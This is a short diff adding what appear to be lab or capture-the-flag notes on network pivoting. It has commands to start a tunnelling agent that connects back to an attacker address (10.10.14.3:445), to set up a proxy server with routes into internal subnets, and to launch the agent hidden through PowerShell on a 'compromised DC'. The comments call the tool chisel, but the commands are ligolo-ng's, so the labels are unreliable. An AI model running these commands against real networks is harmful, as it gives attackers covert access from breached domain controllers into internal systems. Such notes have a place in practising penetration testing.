@@ -1,0 +1,8 @@
+# pivoting chisel client
+nohup ./agent -connect 10.10.14.3:445 -ignore-cert &
+
+# pivoting chisel server
+sudo ip tuntap add user evdaez mode tun ligolo; sudo ip link set ligolo up; sudo ip route add 192.168.110.0/24 dev ligolo; sudo ip route add 192.168.210.0/24 dev ligolo; ./proxy -selfcert -laddr 10.10.14.3:445
+
+# On compromised DC, use powershell, start ligolo-ng agent
+start-process powershell -ArgumentList "C:\temp\agent.exe -connect 10.10.14.3:445 -ignore-cert" -WindowStyle hidden
